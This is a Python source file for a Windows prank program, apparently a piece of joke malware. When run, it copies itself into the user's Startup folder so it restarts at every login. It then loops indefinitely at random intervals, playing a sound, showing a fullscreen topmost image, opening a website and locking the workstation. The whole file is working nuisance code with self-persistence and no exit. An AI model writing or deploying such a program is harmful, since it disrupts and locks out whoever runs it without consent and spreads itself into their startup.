import tkinter.messagebox as msgbox
import time
import winsound
import random
import os
import sys
import shutil
from pathlib import Path
import cv2
import webbrowser
import pyautogui
import ctypes


def showPipe():
    print('Displaying pipe')
    pipeImage = cv2.imread(resourcePath("Media\pipe.png"))
    cv2.namedWindow("Get metal piped!", cv2.WINDOW_NORMAL)
    cv2.imshow("Get metal piped!", pipeImage)
    cv2.setWindowProperty("Get metal piped!", cv2.WND_PROP_TOPMOST, 1)
    cv2.setWindowProperty("Get metal piped!", cv2.WND_PROP_FULLSCREEN, cv2.WINDOW_FULLSCREEN)
    cv2.waitKey(3000)
    cv2.destroyAllWindows()


def copySelf():
    print('Trying to duplicate')
    home_directory = str(Path.home())
    elements = str(sys.argv[0]).split('\\')
    file_name = elements[-1]
    path = home_directory + '/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/' + file_name

    if not (os.path.exists(path)):
        print('Duplicated')
        shutil.copy2(sys.argv[0], path)


def playSound():
    print('Playing sound')
    winsound.PlaySound(resourcePath("Media\pipe.wav"), winsound.SND_FILENAME | winsound.SND_ASYNC)


def main():
    copySelf()
    url = 'http://chillestmonkey.com/'
    msgbox.showwarning("Pipe", "Pipe activated")
    while True:
        playSound()
        showPipe()
        webbrowser.open(url, 0, True)
        LockWorkStation = ctypes.windll.user32.LockWorkStation
        LockWorkStation()

        print('Waiting...')
        randomNumber = random.randint(60, 1200)# 1 to 20 minutes (1 - 1200)
        time.sleep(randomNumber)

            
def resourcePath(relative_path):
    """ Get absolute path to resource, works for dev and for PyInstaller """
    try:
        # PyInstaller creates a temp folder and stores path in _MEIPASS
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")
        
    return os.path.join(base_path, relative_path)

if __name__ == "__main__":
    main()
